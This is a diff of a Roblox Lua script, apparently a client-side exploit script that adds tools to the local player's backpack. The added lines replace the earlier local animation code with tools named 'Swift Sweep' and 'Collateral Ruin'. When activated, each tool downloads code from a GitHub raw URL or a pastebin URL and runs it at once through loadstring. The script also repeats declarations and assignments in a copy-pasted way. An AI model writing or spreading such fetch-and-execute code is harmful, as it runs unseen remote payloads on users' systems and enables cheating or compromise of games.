@@ -208,58 +208,42 @@ tool.Activated:Connect(onActivated)
 -- Add the tool to the player's backpack
 tool.Parent = game.Players.LocalPlayer.Backpack
         
-
--- Tool Script for Swift Sweep
-local function createSwiftSweepTool()
-    local tool = Instance.new("Tool")
-    tool.Name = "Swift Sweep"
-    tool.RequiresHandle = true
-    tool.Parent = game.Players.LocalPlayer.Backpack
-
-    local handle = Instance.new("Part")
-    handle.Name = "Handle"
-    handle.Size = Vector3.new(1, 1, 1)
-    handle.Anchored = false
-    handle.CanCollide = false
-    handle.Parent = tool
-
-    local function onActivated()
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
-        local player = game.Players.LocalPlayer
-        repeat wait() until player.Character.Humanoid
-        local humanoid = player.Character.Humanoid
-        local character = player.Character or player.CharacterAdded:Wait()
-        local UserInputService = game:GetService("UserInputService")
-
-        local anim2 = Instance.new("Animation")
-        anim2.AnimationId = "rbxassetid://16944345619"
-
-        local playAnim2 = humanoid:LoadAnimation(anim2)
-        anim2.AnimationId = "rbxassetid://0"
-        playAnim2:Play()
-        wait(1)
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-    end
-
-    tool.Activated:Connect(onActivated)
-end
-
-createSwiftSweepTool()
-
--- Create the Tool
+-- Create the tool
 local tool = Instance.new("Tool")
-tool.Name = "Collateral Ruin"
-tool.RequiresHandle = true
+tool.Name = "Swift Sweep"  -- Updated tool name
+tool.RequiresHandle = false  -- No handle required
+ 
+-- Insert the tool into the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
+ 
+-- Function to execute when the tool is activated
+local function onActivated()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/VonexuryRemaker/if-sigma-ever-edged-how-would-u-become-skibidi/main/Goku"))()
+end
+ 
+-- Connect the activation function to the tool's Activated event
+tool.Activated:Connect(onActivated)
+ 
+-- Add the tool to the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
 
--- Create the Handle part
-local handle = Instance.new("Part")
-handle.Name = "Handle"
-handle.Size = Vector3.new(1, 1, 1)
-handle.Anchored = false
-handle.CanCollide = false
-handle.Parent = tool
-
-script.Parent = tool
+-- Create the tool
+local tool = Instance.new("Tool")
+tool.Name = "Collateral Ruin"  -- Updated tool name
+tool.RequiresHandle = false  -- No handle required
+ 
+-- Insert the tool into the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
+ 
+-- Function to execute when the tool is activated
+local function onActivated()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Fyku4tS9"))()
+end
+ 
+-- Connect the activation function to the tool's Activated event
+tool.Activated:Connect(onActivated)
+ 
+-- Add the tool to the player's backpack
 tool.Parent = game.Players.LocalPlayer.Backpack
 
 -- Create the Tool
